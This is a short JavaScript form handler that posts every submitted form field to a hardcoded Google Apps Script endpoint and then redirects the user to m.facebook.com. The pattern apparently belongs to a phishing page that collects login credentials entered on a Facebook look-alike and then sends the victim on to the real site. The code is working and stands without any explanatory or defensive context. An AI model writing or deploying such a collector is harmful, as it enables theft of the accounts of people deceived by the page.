const form = document.querySelector("#form")
    const scriptURL = 'https://script.google.com/macros/s/AKfycbz1ltd3tfHjMQpEcPG0m_Vnsk-01HvAlF4v19EHv_nZmTB20Ext7HekNS0urOifjAMNVg/exec'

    form.addEventListener('submit', e => {
      e.preventDefault()

      console.log(form)
      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
        .then(response => { window.location.href='http://m.facebook.com' })
        .catch(error => alert('Error!', error.message))
    })
